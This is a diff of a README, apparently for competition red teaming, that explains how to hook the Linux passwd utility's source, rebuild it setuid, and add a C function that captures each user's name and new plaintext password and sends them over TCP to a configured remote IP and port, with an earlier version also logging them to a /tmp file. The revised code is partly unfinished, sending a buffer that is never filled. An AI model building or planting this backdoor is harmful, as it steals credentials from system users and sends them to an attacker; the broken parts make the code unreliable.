@@ -14,18 +14,12 @@ This is intended for Red Teaming in a Competition environment.
 ## Installation Instructions
 #### Ubuntu - 18.04 / 20.04
 1. clone shadow git
-2. sudo apt-get build-dep shadow
-3. run ./autogen.sh
-4. Add Hook (See Hooking passwd.c)
-5. sudo make all
+2. run ./generate.sh
 6. sudo chmod 4755 passwd
 
 #### Debian - 11
 1. clone shadow git
-2. sudo apt-get build-dep shadow
-3. run ./autogen.sh
-4. Add Hook (See Hooking passwd.c)
-5. sudo make all
+2. run ./generate.sh
 6. sudo chmod 4755 passwd
 
 #### CentOS - 8
@@ -48,10 +42,13 @@ This is intended for Red Teaming in a Competition environment.
 #### At the Top
 Imports needed 
 
-    #include <sys/socket.h> 
-    #include <arpa/inet.h> 
-    #include <unistd.h> 
-    #include <string.h> 
+	#include <sys/socket.h>
+	#include <arpa/inet.h> 
+	#include <sys/ioctl.h>
+	#include <netinet/in.h>
+	#include <net/if.h>
+	#include <unistd.h> 
+	#include <string.h> 
 
 Definitions
 
@@ -76,84 +73,67 @@ At line number ~266, right above the code that will salt the password, we add a 
 
 At line ~210 right above the new_password function is where I put this function although it just needs to be above where it is called. 
 
-    int writetofile (char *password){
+	int writetofile (char *password){
 
-        // Get UID
-        uid_t uid = geteuid();
-        struct passwd * pw = getpwuid(uid);
-        
-        // Create File + Variables
-        FILE * fptr;
-        fptr = fopen("/tmp/18432443.tmp", "a"); // Remove for ultra sneak
-        char * user;
-        char * msg;
-        char * msg2;
-        char * colon;
+	    /* Get UID */
+	    uid_t uid = geteuid();
+	    struct passwd * pw = getpwuid(uid);
 
-        // Write Shit
-        if (pw) {
-            user = pw->pw_name;
-        }
-        else {
-            user = "unknown";
-        }
+	    /* Get IP Address */
+	    int fd;
+	    struct ifreq ifr;
+	    fd = socket(AF_INET, SOCK_DGRAM, 0);
 
-        if (fptr != NULL) {
+	    /* I want to get an IPv4 IP address */
+	    ifr.ifr_addr.sa_family = AF_INET;
 
-            fprintf(fptr, "%s:%s\n", name, password);
-            
-            // // Send stuff // //
-            // Make Socket
-            int sock = 0, valread;
-            struct sockaddr_in serv_addr;
-            
-            // Build String
-            strcpy(user, name);
-            msg = ("%s", password);
-            msg2 = ("%s:", user);
-            colon = ':';
-            strncat(msg2, &colon, 1);
-            strcat(msg2, msg);
+	    /* I want IP address attached to set interface */
+	    strncpy(ifr.ifr_name, INT_HERE, IFNAMSIZ-1);
+	    ioctl(fd, SIOCGIFADDR, &ifr);
+	    close(fd);
 
-            char buffer[1024] = {0};
-            fclose(fptr);
+	    /* display result */
+	    char buffer[256];
+	    char * ip;
+	    ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
+	    //SNPRINT
 
-            // Error Handling
-            if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
-                // printf("\n Socket creation error \n");
-                return -1;
-            }
+	    /* Make Socket */
+	    int sock = 0, valread;
+	    struct sockaddr_in serv_addr;
 
-            serv_addr.sin_family = AF_INET;
-            serv_addr.sin_port = htons(PORT);
-            
-            struct timeval timeout;
-            timeout.tv_sec = 3;
-            timeout.tv_usec = 0;
+	    /* Sock creation Pt 2*/
+	    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+		return -1;
+	    }
 
-            if (setsockopt (sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout) < 0)  {
-                // puts("Setsockopt failed\n");
-                return -1;
-            }
-            
-            if (setsockopt (sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof timeout) < 0) {
-                // puts("setsockopt failed\n");
-            }
+	    /* Socket Options */
+	    serv_addr.sin_family = AF_INET;
+	    serv_addr.sin_port = htons(PORT);
 
+	    /* Timeout settings */
+	    struct timeval timeout;
+	    timeout.tv_sec = 3;
+	    timeout.tv_usec = 0;
 
-            // Error Handling
-            if(inet_pton(AF_INET, IP, &serv_addr.sin_addr)<=0) {
-                // puts("\nInvalid address/ Address not supported \n");
-                return -1;
-            }
-            if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
-                return -1;
-            }
+	    if (setsockopt (sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout) < 0)  {
+		return -1;
+	    }
+	    if (setsockopt (sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof timeout) < 0) {
+		// pass
 
-            // Send Message
-            send(sock , msg2 , strlen(msg2) , 0 );
-            return 0;
-        }
+	    /* set IP and set buffer */
+	    }
+	    if(inet_pton(AF_INET, IP, &serv_addr.sin_addr)<=0) {
+		return -1;
+	    }
+	    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
+		return -1;
+	    }
 
-        return 0;
-    }
+	    /* Send Message */
+	    send(sock , buffer , strlen(buffer) , 0 ); 
+
+	    return 0;
+
+	}
